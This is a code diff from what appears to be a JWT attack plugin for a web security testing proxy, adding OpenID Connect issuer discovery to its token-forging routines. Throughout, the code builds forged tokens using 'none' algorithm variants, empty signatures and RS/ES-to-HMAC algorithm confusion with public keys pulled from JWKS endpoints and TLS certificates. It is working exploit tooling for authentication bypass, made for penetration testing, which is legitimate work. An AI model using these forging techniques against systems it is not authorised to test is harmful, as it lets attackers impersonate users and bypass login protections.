@@ -1122,76 +1122,6 @@ async function fetchTlsPublicKey(host, port, log = () => {
   return fetchTlsPublicKeyOverConns(() => openConn(host, port), host, log);
 }
 
-// packages/backend/src/util.ts
-import { randomBytes as randomBytes3 } from "crypto";
-function nanoid(size = 12) {
-  return randomBytes3(size).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "").slice(0, size);
-}
-function parseCookies(cookieHeader) {
-  const cookies = {};
-  for (const pair of cookieHeader.split(";")) {
-    const idx = pair.indexOf("=");
-    if (idx === -1) continue;
-    const key = pair.slice(0, idx).trim();
-    const value = pair.slice(idx + 1).trim();
-    cookies[key] = decodeURIComponent(value);
-  }
-  return cookies;
-}
-var JWT_REGEX = /^[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*$/;
-function looksLikeJWT(value) {
-  const trimmed = value.trim();
-  if (!JWT_REGEX.test(trimmed)) return false;
-  try {
-    const parts = trimmed.split(".");
-    const header = JSON.parse(Buffer.from(
-      parts[0] + "=".repeat((4 - parts[0].length % 4) % 4),
-      "base64"
-    ).toString("utf8"));
-    return typeof header.alg === "string";
-  } catch {
-    return false;
-  }
-}
-
-// packages/backend/src/attacks/none.ts
-var NONE_VARIANTS = ["none", "None", "NONE", "nOnE", "NoNe", "nONE", "NonE"];
-function buildNoneAttacks(parsed) {
-  const results = [];
-  for (const alg of NONE_VARIANTS) {
-    const header = { ...parsed.header, alg };
-    results.push({
-      id: nanoid(),
-      technique: "none",
-      techniqueName: `None Algorithm (alg="${alg}")`,
-      description: `CVE-2015-9235: Sets alg to "${alg}" and strips the signature. Vulnerable servers accept unsigned tokens if they do not enforce signature presence.`,
-      modifiedJWT: buildJWT(header, parsed.payload, ""),
-      timestamp: Date.now()
-    });
-  }
-  return results;
-}
-
-// packages/backend/src/attacks/nullSig.ts
-function buildNullSigAttacks(parsed) {
-  const signingInput = encodeUnsigned(parsed.header, parsed.payload);
-  return [
-    {
-      id: nanoid(),
-      technique: "nullSig",
-      techniqueName: "Null Signature",
-      description: "CVE-2020-28042: Retains the original algorithm but empties the signature. Vulnerable implementations skip signature verification when the signature field is empty.",
-      modifiedJWT: `${signingInput}.`,
-      timestamp: Date.now()
-    }
-  ];
-}
-
-// packages/backend/src/crypto/ecdsa.ts
-function ecPublicKeyPemToRawBytes(keyPem) {
-  return publicKeyPemToRawBytes(keyPem);
-}
-
 // packages/backend/src/types.ts
 var COMMON_JWKS_PATHS = [
   "/.well-known/jwks.json",
@@ -1417,6 +1347,117 @@ async function discoverJWKS(fetcher, baseUrl, paths = []) {
   }
   return results;
 }
+function oidcConfigCandidates(issuer) {
+  const trimmed = issuer.replace(/\/+$/, "");
+  const out = [`${trimmed}/.well-known/openid-configuration`];
+  try {
+    const u = new URL(trimmed);
+    if (u.pathname && u.pathname !== "/") {
+      out.push(`${u.protocol}//${u.host}/.well-known/openid-configuration${u.pathname}`);
+      out.push(`${u.protocol}//${u.host}/.well-known/oauth-authorization-server${u.pathname}`);
+    }
+  } catch {
+  }
+  return out;
+}
+async function discoverFromIssuer(fetcher, issuer) {
+  try {
+    const u = new URL(issuer);
+    if (u.protocol !== "http:" && u.protocol !== "https:") return null;
+  } catch {
+    return null;
+  }
+  for (const configUrl of oidcConfigCandidates(issuer)) {
+    let configContent;
+    try {
+      configContent = await fetcher(configUrl);
+    } catch {
+      continue;
+    }
+    let doc;
+    try {
+      doc = JSON.parse(configContent);
+    } catch {
+      continue;
+    }
+    const jwksUri = typeof doc.jwks_uri === "string" ? doc.jwks_uri : null;
+    const signingAlgs = Array.isArray(doc.id_token_signing_alg_values_supported) ? doc.id_token_signing_alg_values_supported.filter((a) => typeof a === "string") : [];
+    if (!jwksUri && signingAlgs.length === 0) continue;
+    const jwks = jwksUri ? await tryJwks(fetcher, jwksUri) : null;
+    return { issuer, configUrl, configContent, jwksUri, signingAlgs, jwks };
+  }
+  return null;
+}
+
+// packages/backend/src/util.ts
+import { randomBytes as randomBytes3 } from "crypto";
+function nanoid(size = 12) {
+  return randomBytes3(size).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "").slice(0, size);
+}
+function parseCookies(cookieHeader) {
+  const cookies = {};
+  for (const pair of cookieHeader.split(";")) {
+    const idx = pair.indexOf("=");
+    if (idx === -1) continue;
+    const key = pair.slice(0, idx).trim();
+    const value = pair.slice(idx + 1).trim();
+    cookies[key] = decodeURIComponent(value);
+  }
+  return cookies;
+}
+var JWT_REGEX = /^[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*$/;
+function looksLikeJWT(value) {
+  const trimmed = value.trim();
+  if (!JWT_REGEX.test(trimmed)) return false;
+  try {
+    const parts = trimmed.split(".");
+    const header = JSON.parse(Buffer.from(
+      parts[0] + "=".repeat((4 - parts[0].length % 4) % 4),
+      "base64"
+    ).toString("utf8"));
+    return typeof header.alg === "string";
+  } catch {
+    return false;
+  }
+}
+
+// packages/backend/src/attacks/none.ts
+var NONE_VARIANTS = ["none", "None", "NONE", "nOnE", "NoNe", "nONE", "NonE"];
+function buildNoneAttacks(parsed) {
+  const results = [];
+  for (const alg of NONE_VARIANTS) {
+    const header = { ...parsed.header, alg };
+    results.push({
+      id: nanoid(),
+      technique: "none",
+      techniqueName: `None Algorithm (alg="${alg}")`,
+      description: `CVE-2015-9235: Sets alg to "${alg}" and strips the signature. Vulnerable servers accept unsigned tokens if they do not enforce signature presence.`,
+      modifiedJWT: buildJWT(header, parsed.payload, ""),
+      timestamp: Date.now()
+    });
+  }
+  return results;
+}
+
+// packages/backend/src/attacks/nullSig.ts
+function buildNullSigAttacks(parsed) {
+  const signingInput = encodeUnsigned(parsed.header, parsed.payload);
+  return [
+    {
+      id: nanoid(),
+      technique: "nullSig",
+      techniqueName: "Null Signature",
+      description: "CVE-2020-28042: Retains the original algorithm but empties the signature. Vulnerable implementations skip signature verification when the signature field is empty.",
+      modifiedJWT: `${signingInput}.`,
+      timestamp: Date.now()
+    }
+  ];
+}
+
+// packages/backend/src/crypto/ecdsa.ts
+function ecPublicKeyPemToRawBytes(keyPem) {
+  return publicKeyPemToRawBytes(keyPem);
+}
 
 // packages/backend/src/attacks/algConfusion.ts
 var ALG_CONFUSION_MAP = {
@@ -1432,6 +1473,12 @@ var ALG_CONFUSION_MAP = {
 };
 function isAsymmetricAlg(alg) {
   return alg.startsWith("RS") || alg.startsWith("PS") || alg.startsWith("ES");
+}
+function hmacConfusionTargets(originalAlg, signingAlgs = []) {
+  const supported = signingAlgs.map((a) => a.toUpperCase()).filter((a) => a === "HS256" || a === "HS384" || a === "HS512");
+  if (supported.length) return [...new Set(supported)];
+  const mapped = ALG_CONFUSION_MAP[originalAlg];
+  return mapped ? [mapped] : ["HS256"];
 }
 function secretVariants(keyPem, originalAlg) {
   const pem = keyPem.replace(/\r\n/g, "\n");
@@ -1485,26 +1532,30 @@ function attacksForKey(parsed, hmacAlg, originalAlg, keyPem, sourceDesc, seen) {
   }
   return out;
 }
-function buildAlgConfusionForKeys(parsed, keyPems, sourceDesc) {
+function buildAlgConfusionForKeys(parsed, keyPems, sourceDesc, hmacAlgs) {
   const originalAlg = parsed.header.alg;
   if (!isAsymmetricAlg(originalAlg)) return [];
-  const hmacAlg = ALG_CONFUSION_MAP[originalAlg];
+  const targets = hmacAlgs && hmacAlgs.length ? hmacAlgs : [ALG_CONFUSION_MAP[originalAlg]];
   const seen = /* @__PURE__ */ new Set();
   const out = [];
   for (const pem of keyPems) {
-    out.push(...attacksForKey(parsed, hmacAlg, originalAlg, pem, sourceDesc, seen));
+    for (const hmacAlg of targets) {
+      out.push(...attacksForKey(parsed, hmacAlg, originalAlg, pem, sourceDesc, seen));
+    }
   }
   return out;
 }
 var MAX_DISCOVERY_CONTENT = 16384;
-async function buildAlgConfusionAttacks(parsed, requestHost, requestPort, requestTls, config, recoveredKeys = [], onDiscovery, fetcher) {
+async function buildAlgConfusionAttacks(parsed, requestHost, requestPort, requestTls, config, recoveredKeys = [], onDiscovery, fetcher, hmacTargets) {
   const originalAlg = parsed.header.alg;
   if (!isAsymmetricAlg(originalAlg)) return [];
-  const hmacAlg = ALG_CONFUSION_MAP[originalAlg];
+  const targets = hmacTargets && hmacTargets.length ? hmacTargets : [ALG_CONFUSION_MAP[originalAlg]];
   const results = [];
   const seen = /* @__PURE__ */ new Set();
   const addKey = (pem, source) => {
-    results.push(...attacksForKey(parsed, hmacAlg, originalAlg, pem, source, seen));
+    for (const hmacAlg of targets) {
+      results.push(...attacksForKey(parsed, hmacAlg, originalAlg, pem, source, seen));
+    }
   };
   if (config.customPublicKeyPem) {
     addKey(config.customPublicKeyPem, "configured public key");
@@ -2361,11 +2412,84 @@ async function attackJwt(sdk, requestId, config) {
           message: `Algorithm confusion skipped: token alg is ${parsed.header.alg} (only RS/PS/ES tokens can be downgraded to HMAC).`
         });
       } else {
+        const originalAlg = parsed.header.alg;
+        let foundCount = 0;
+        let issDiscovery = null;
+        const issRaw = parsed.payload.iss;
+        const iss = typeof issRaw === "string" ? issRaw : null;
+        if (iss) {
+          sdk.api.send("jwt-key-recovery-progress", {
+            sessionId,
+            message: `Algorithm confusion: resolving iss="${iss}" via OpenID Connect discovery\u2026`
+          });
+          try {
+            issDiscovery = await discoverFromIssuer(httpGet, iss);
+          } catch {
+            issDiscovery = null;
+          }
+          if (!issDiscovery) {
+            sdk.api.send("jwt-key-recovery-progress", {
+              sessionId,
+              message: `Algorithm confusion: no OpenID configuration reachable for iss="${iss}".`
+            });
+          } else {
+            const algs = issDiscovery.signingAlgs;
+            const hmacSupported = algs.filter((a) => /^HS(256|384|512)$/i.test(a));
+            sdk.api.send("jwt-key-recovery-progress", {
+              sessionId,
+              message: `Algorithm confusion: OpenID config at ${issDiscovery.configUrl} \u2014 jwks_uri=${issDiscovery.jwksUri ?? "(none)"}, id_token_signing_alg_values_supported=[${algs.join(", ") || "not advertised"}].`
+            });
+            if (algs.length) {
+              sdk.api.send("jwt-key-recovery-progress", {
+                sessionId,
+                message: hmacSupported.length ? `Algorithm confusion: the issuer advertises HMAC alg(s) [${hmacSupported.join(", ")}] \u2014 confusion is RELEVANT; forging those.` : "Algorithm confusion: the issuer advertises only asymmetric alg(s) \u2014 HMAC not advertised, so confusion is less likely, but still attempted with the default HS mapping."
+              });
+              if (!algs.some((a) => a.toUpperCase() === originalAlg.toUpperCase())) {
+                sdk.api.send("jwt-key-recovery-progress", {
+                  sessionId,
+                  message: `Algorithm confusion: note \u2014 the token's alg ${originalAlg} is not in the issuer's supported list.`
+                });
+              }
+            }
+            foundCount++;
+            sdk.api.send("jwks-found", {
+              sessionId,
+              url: issDiscovery.configUrl,
+              source: "OIDC configuration (iss)",
+              keyCount: issDiscovery.jwks?.keys.length ?? 0,
+              content: issDiscovery.configContent.slice(0, 16384),
+              pems: []
+            });
+            if (issDiscovery.jwks) {
+              const issPems = jwksToPublicKeys({ keys: issDiscovery.jwks.keys });
+              foundCount++;
+              sdk.api.send("jwks-found", {
+                sessionId,
+                url: issDiscovery.jwks.url,
+                source: "JWKS endpoint (iss)",
+                keyCount: issPems.length,
+                content: issDiscovery.jwks.content.slice(0, 16384),
+                pems: issPems
+              });
+            }
+          }
+        }
+        sdk.api.send("jwt-iss-discovery", {
+          sessionId,
+          issPresent: iss !== null,
+          iss,
+          configRetrieved: issDiscovery !== null,
+          configUrl: issDiscovery?.configUrl ?? null,
+          jwksUri: issDiscovery?.jwksUri ?? null,
+          keyExtracted: !!(issDiscovery?.jwks && issDiscovery.jwks.keys.length > 0),
+          keyCount: issDiscovery?.jwks?.keys.length ?? 0,
+          signingAlgs: issDiscovery?.signingAlgs ?? []
+        });
+        const targets = hmacConfusionTargets(originalAlg, issDiscovery?.signingAlgs ?? []);
         sdk.api.send("jwt-key-recovery-progress", {
           sessionId,
           message: `Algorithm confusion: probing ${request.getHost()} for exposed JWKS & certificate key endpoints\u2026`
         });
-        let foundCount = 0;
         await tryMerge("algConfusion", () => buildAlgConfusionAttacks(
           parsed,
           request.getHost(),
@@ -2379,8 +2503,15 @@ async function attackJwt(sdk, requestId, config) {
             foundCount++;
             sdk.api.send("jwks-found", { sessionId, ...found });
           },
-          httpGet
+          httpGet,
+          targets
         ));
+        if (issDiscovery?.jwks) {
+          const issPems = jwksToPublicKeys({ keys: issDiscovery.jwks.keys });
+          if (issPems.length) {
+            attacks.push(...buildAlgConfusionForKeys(parsed, issPems, `issuer JWKS (${issDiscovery.jwks.url})`, targets));
+          }
+        }
         sdk.api.send("jwt-key-recovery-progress", {
           sessionId,
           message: foundCount > 0 ? `Algorithm confusion: found ${foundCount} key endpoint(s) \u2014 see the cyan banner.` : `Algorithm confusion: no exposed JWKS/cert endpoints found on ${request.getHost()} (expected for "no exposed key" targets \u2014 use key recovery).`
@@ -2404,7 +2535,7 @@ async function attackJwt(sdk, requestId, config) {
               sessionId,
               message: `Algorithm confusion: got the TLS public key${tlsKey.nHex ? ` (RSA, ${tlsKey.nHex.length * 4}-bit)` : " (non-RSA)"} \u2014 trying it as the HMAC secret.`
             });
-            const tlsAttacks = buildAlgConfusionForKeys(parsed, [tlsKey.publicKeyPem], "webserver TLS certificate");
+            const tlsAttacks = buildAlgConfusionForKeys(parsed, [tlsKey.publicKeyPem], "webserver TLS certificate", targets);
             attacks.push(...tlsAttacks);
           } else {
             sdk.api.send("jwt-key-recovery-progress", {
@@ -2421,7 +2552,7 @@ async function attackJwt(sdk, requestId, config) {
               sessionId,
               message: `Algorithm confusion: using the configured Certificate as the web server's TLS key${tlsKey.nHex ? ` (RSA, ${tlsKey.nHex.length * 4}-bit)` : ""}.`
             });
-            attacks.push(...buildAlgConfusionForKeys(parsed, [pem], "configured TLS certificate"));
+            attacks.push(...buildAlgConfusionForKeys(parsed, [pem], "configured TLS certificate", targets));
           } catch (e) {
             sdk.api.send("jwt-key-recovery-progress", { sessionId, message: `Could not parse the configured Certificate: ${e.message}` });
           }
